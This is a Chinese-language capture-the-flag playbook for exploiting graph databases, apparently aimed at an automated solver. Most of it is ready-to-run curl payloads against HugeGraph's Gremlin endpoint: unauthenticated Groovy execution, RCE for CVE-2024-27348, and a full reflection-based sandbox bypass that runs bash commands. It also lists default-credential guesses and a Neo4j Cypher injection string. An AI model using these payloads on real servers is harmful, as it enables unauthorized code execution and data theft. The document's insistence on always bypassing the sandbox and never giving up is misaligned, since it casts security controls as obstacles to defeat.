# 图数据库利用（HugeGraph / Neo4j）

> 适用：关联关系检索引擎、知识图谱、图数据库服务题（图数据库类）。

## 指纹识别
- 端口 8080 + `/gremlin`、`/graphs`、`gremlin-server` → HugeGraph。
- 端口 7474 / 7687 + `/db/data`、`neo4j` → Neo4j。
- 响应含 `gremlin-groovy`、`hugegraph`、`neo4j`、`bolt` 等。

## HugeGraph（重点）

### 认证与未授权
```bash
# 探测 Gremlin 端点
curl -s http://TARGET:8080/gremlin
curl -s http://TARGET:8080/apis/
# 未授权 Gremlin 执行（老版本）
curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
  -d '{"gremlin":"g.V().count()"}'
```

### RCE（CVE-2024-27348，HugeGraph-Server）

CVE-2024-27348 核心：HugeGraph-Server 的 Gremlin 端点未正确沙箱，Groovy 脚本可执行任意代码（1.3.0 之前版本）。

**先测未授权**：
```bash
curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
  -d '{"gremlin":"1+1"}'
# 返回 2 = 未授权可执行 Groovy
```

**RCE payload（按顺序试，命中即停）**：
```bash
# 1. Groovy 直接 execute（最简，老版本直接命中）
curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
  -d '{"gremlin":"\"id\".execute().text"}'

# 2. bash -c 变体
curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
  -d '{"gremlin":"[\"bash\",\"-c\",\"id\"].execute().text"}'

# 3. 反射链（若 1/2 被拦）
curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
  -d '{"gremlin":"Class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")"}'

# 4. 反射拿 Runtime（CVE-2024-27348 沙箱绕过核心）
curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
  -d '{"gremlin":"def r=Class.forName(\"java.lang.Runtime\").getDeclaredMethods().find{it.name==\"getRuntime\"}.invoke(null); r.exec(\"id\").text"}'
```

**读 flag**：
```bash
curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
  -d '{"gremlin":"[\"bash\",\"-c\",\"cat /flag /challenge/flag* 2>/dev/null\"].execute().text"}'
```

**关键陷阱**：
- 返回 `Not allowed to execute command via Gremlin` 说明有 HugeSecurityManager 沙箱。payload 3/4 的
  纯反射**不足以**绕过（checkExec 仍会拦）——直接跳到下方「SecurityManager 绕过 #0 线程改名反射」，
  那才是 CVE-2024-27348 的官方绕过。1.0.0–1.2.x 默认都带该沙箱，命中 `Not allowed` 就用 #0。
- 需要认证时试 admin/admin、admin/password；或先未授权探测 `/apis`、`/graphs`。
- 拿到 RCE 后 `find / -name 'flag*' 2>/dev/null`。

### SecurityManager 拦截（HugeGraph 1.2.0+ 打了补丁）

返回 `Not allowed to execute command via Gremlin`、`HugeSecurityManager` 相关报错，说明题目在标准
CVE-2024-27348 之上加了沙箱。此时**不要反复重试标准 `execute()` / 反射 payload**（会烧预算），
拦截信息本身就是情报：它证明 Gremlin 确实在执行 Groovy（RCE 入口存在），只是被沙箱拦了。

**第一步：逆向沙箱的放行条件**
```bash
# 列出 Gremlin binding 变量（确定可用入口对象）
curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
  -d '{"gremlin":"this.binding.variables.keySet()"}'
# 常见返回 ["hugegraph","hook"]：hugegraph=图实例，hook=自定义钩子

# 列出 SecurityManager 被覆盖的 check 方法（判断拦了什么）
curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
  -d '{"gremlin":"System.securityManager.class.declaredMethods*.name"}'
```

**绕过方向（按顺序试，命中即停）**：
```bash
# 0. 【首选】线程改名反射绕过（CVE-2024-27348 官方 PoC / vulhub）：
#    HugeSecurityManager 只拦线程名以 gremlin-server-exec / task-worker 开头的执行，
#    用反射把当前线程改名（改成任意名如 "x"），后续所有 check 直接放行 → 稳定 RCE。
#    命令用 List 传参：Arrays.asList("bash","-c","cat /flag* /challenge/flag* 2>/dev/null")。
curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' -d '{"gremlin":"Thread thread = Thread.currentThread();Class clz = Class.forName(\"java.lang.Thread\");java.lang.reflect.Field field = clz.getDeclaredField(\"name\");field.setAccessible(true);field.set(thread, \"x\");Class pb = Class.forName(\"java.lang.ProcessBuilder\");java.lang.reflect.Constructor ct = pb.getConstructor(java.util.List.class);java.util.List cmd = java.util.Arrays.asList(\"bash\",\"-c\",\"cat /flag* /challenge/flag* 2>/dev/null || id\");Object inst = ct.newInstance(cmd);java.lang.reflect.Method start = pb.getMethod(\"start\");new String(start.invoke(inst).getInputStream().readAllBytes());","bindings":{},"language":"gremlin-groovy","aliases":{}}'
# 若目标无 readAllBytes（老 JDK），把结尾换成 org.apache.commons.io.IOUtils.toString(start.invoke(inst).getInputStream())

# 1. GroovyShell 二次加载：某些补丁只拦 Gremlin 直接执行，不拦新开 GroovyShell
def sh=new groovy.lang.GroovyShell(); sh.evaluate('"cat /flag /challenge/flag* 2>/dev/null".execute().text')

# 2. setAccessible 反射 Runtime（绕过 checkPermission 的公开利用变体）
def r=Class.forName("java.lang.Runtime"); def m=r.getDeclaredMethod("getRuntime"); m.setAccessible(true); def rt=m.invoke(null); def e=rt.getClass().getDeclaredMethod("exec",String.class); e.setAccessible(true); e.invoke(rt,"cat /flag /challenge/flag*").text

# 3. 利用 binding 变量本身：hugegraph / hook 可能有可利用方法
hugegraph.class.declaredMethods*.name  # 枚举方法
hook.class.declaredMethods*.name        # 枚举 hook 方法

# 4. Groovy 元编程（metaClass 注入）绕过 package access 检查
```

**关键**：目标始终是「绕过沙箱执行命令」，不是「换个题/放弃」。拦截信息能告诉我们
沙箱具体拦了哪个 check 方法，据此选绕过点，比盲目试 payload 高效得多。

## Neo4j（次要）

### Cypher 注入
```bash
# 登录接口若拼接 Cypher 查询
' OR 1=1 RETURN labels() //
# Neo4j Shell Server 注入（CVE-2021-34371）
```

## 通用思路
1. 图数据库题通常不是让你"爆破"，而是**注入 Gremlin/Cypher 查询**或利用**未授权 RCE**。
2. 先确认端点是否未授权，再找 Gremlin/Cypher 注入点。
3. 目标是读图数据里的 flag，或 RCE 后搜文件。
4. 同主机可能还有其他服务（图数据库类门户），逐个端口独立指纹。
